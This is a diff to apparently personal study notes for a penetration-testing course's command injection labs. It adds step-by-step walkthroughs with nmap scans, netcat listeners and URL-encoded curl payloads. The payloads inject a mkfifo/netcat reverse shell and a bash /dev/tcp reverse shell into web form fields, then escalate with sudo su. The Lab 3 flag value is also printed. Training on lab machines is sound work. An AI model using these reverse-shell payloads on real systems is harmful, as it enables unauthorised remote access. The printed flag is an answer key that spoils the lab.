@@ -234,14 +234,14 @@ Lab 1 - Follow the steps above and exploit the command injection vulnerability o
 Lab 2 - For this exercise the Mountain Vaults application runs on Linux (VM #2). Exploit the command injection vulnerability like we did in this section, but this time use Linux specific commands to obtain a reverse shell. As soon as you have a reverse shell use the sudo su command to gain elevated privileges. Once you gain elevated privileges, find the flag located in the /opt/config.txt file.
 >``` shell
 ># Start a Netcat listener on port 4444 to catch the reverse shell connection
->nc -lvnp 4444
+>kali@kali:~$ nc -lvnp 4444
 >
 ># ========== Expected Result ==========
 >listening on [any] 4444 ...
 ># =====================================
 >
 ># Scan all TCP ports on the target to identify which ports are open (Target: 192.168.110.16)
->nmap -p- 192.168.110.16
+>kali@kali:~$ nmap -p- 192.168.110.16
 >
 ># ========== Expected Result ==========
 >Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 07:13 CST
@@ -256,7 +256,7 @@ Lab 2 - For this exercise the Mountain Vaults application runs on Linux (VM #2).
 ># =====================================
 >
 ># Verify command injection by appending ';whoami' to the Archive parameter (URL encoded) (Target: 192.168.110.16)
->curl -X POST --data 'Archive=git%3Bwhoami' http://192.168.110.16:80/archive
+>kali@kali:~$ curl -X POST --data 'Archive=git%3Bwhoami' http://192.168.110.16:80/archive
 >
 ># ========== Expected Result ==========
 >...
@@ -267,7 +267,7 @@ Lab 2 - For this exercise the Mountain Vaults application runs on Linux (VM #2).
 ># =====================================
 >
 ># Check if 'nc' (netcat) is installed on the target system, which is required for reverse shell (Target: 192.168.110.16)
->curl -X POST --data 'Archive=git%3Bwhich%20nc' http://192.168.110.16:80/archive
+>kali@kali:~$ curl -X POST --data 'Archive=git%3Bwhich%20nc' http://192.168.110.16:80/archive
 >
 ># ========== Expected Result ==========
 >...
@@ -282,7 +282,7 @@ Lab 2 - For this exercise the Mountain Vaults application runs on Linux (VM #2).
 ># - Create a named pipe at /tmp/f
 ># - Use the pipe to send a shell to the attacker using Netcat
 ># - Connects back to the attacker's machine on port 4444 (Target: 192.168.110.16, Kali IP: 192.168.45.203)
->curl -X POST --data 'Archive=git%3Brm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.45.203%204444%20%3E%2Ftmp%2Ff' http://192.168.110.16:80/archive
+>kali@kali:~$ curl -X POST --data 'Archive=git%3Brm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.45.203%204444%20%3E%2Ftmp%2Ff' http://192.168.110.16:80/archive
 >
 ># ========== Expected Result ==========
 >connect to [192.168.45.203] from (UNKNOWN) [192.168.110.16] 54158
@@ -291,7 +291,7 @@ Lab 2 - For this exercise the Mountain Vaults application runs on Linux (VM #2).
 ># =====================================
 >
 ># Elevate privileges to root if the user has sudo access without a password
->sudo su
+>$ sudo su
 >
 ># Confirm current user identity (should return 'root' after successful privilege escalation)
 >whoami
@@ -311,9 +311,79 @@ Lab 2 - For this exercise the Mountain Vaults application runs on Linux (VM #2).
 
 Lab 3 - Capstone Lab: Start the Future Factor Authentication application on VM #3. Identify the vulnerability, exploit it and obtain a reverse shell. Use sudo su in the reverse shell to obtain elevated privileges and find the flag located in the /root/ directory.
 >``` shell
+># Test if the target machine is reachable (Target: 192.168.110.16)
+>kali@kali:~$ ping -c 3 192.168.110.16
 >
+># ========== Expected Result ==========
+>PING 192.168.110.16 (192.168.110.16) 56(84) bytes of data.
+>64 bytes from 192.168.110.16: icmp_seq=1 ttl=61 time=37.6 ms
+>64 bytes from 192.168.110.16: icmp_seq=2 ttl=61 time=36.6 ms
+>...
+># =====================================
+>
+># Scan all TCP ports on the target to identify which ports are open (Target: 192.168.110.16)
+>kali@kali:~$ nmap -p- 192.168.110.16
+>
+># ========== Expected Result ==========
+>Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 07:37 CST
+>Nmap scan report for 192.168.110.16
+>Host is up (0.038s latency).
+>Not shown: 65533 closed tcp ports (reset)
+>PORT   STATE SERVICE
+>22/tcp open  ssh
+>80/tcp open  http
+>
+>Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds
+># =====================================
+>
+># Visit the login page in a browser to manually inspect input fields (Target: 192.168.110.16)
+># - The page has three fields: username, password, and ffa (the vulnerable one)
+>visit in browser: http://192.168.110.16/login
+>
+># Start a Netcat listener on port 4444 to catch the reverse shell connection
+>kali@kali:~$ nc -lvnp 4444
+>
+># ========== Expected Result ==========
+>listening on [any] 4444 ...
+># =====================================
+>
+># Exploit the command injection vulnerability in the 'ffa' field using a reverse shell payload (Target: 192.168.110.16, Kali IP: 192.168.45.203)
+># - Breaks out of double quotes
+># - Executes a reverse shell using bash to connect back to Kali
+># - Comments out the rest of the original command to avoid syntax errors
+>kali@kali:~$ curl -X POST http://192.168.110.16/login \
+>  -d 'username=test' \
+>  -d 'password=test' \
+>  -d 'ffa=%22%20%26%26%20bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.203%2F4444%200%3E%261%27%20%23'
+>
+># ========== Expected Result ==========
+>connect to [192.168.45.203] from (UNKNOWN) [192.168.110.16] 37460
+>bash: cannot set terminal process group (1): Inappropriate ioctl for device
+>bash: no job control in this shell
+>To run a command as administrator (user "root"), use "sudo <command>".
+>See "man sudo_root" for details.
+>
+>yelnats@b94a0c891dc9:/app$
+># =====================================
+>
+># In the reverse shell: escalate privileges to root using sudo (if allowed without password)
+>yelnats@b94a0c891dc9:/app$ sudo su
+>
+># Confirm the current user after privilege escalation
+>whoami
+>
+># ========== Expected Result ==========
+>root
+># =====================================
+>
+># Read and display the flag located in the root user's home directory
+>cat /root/flag.txt
+>
+># ========== Expected Result ==========
+>OS{db9c4725c424008bfd56ca3bfff0fb49}
+># =====================================
 >```
->
+>OS{db9c4725c424008bfd56ca3bfff0fb49}
 
 Lab 4 - Capstone Lab: Enumerate the machine VM #4. Find the web application and get access to the system. The flag can be found in C:\inetpub\.
 >``` shell
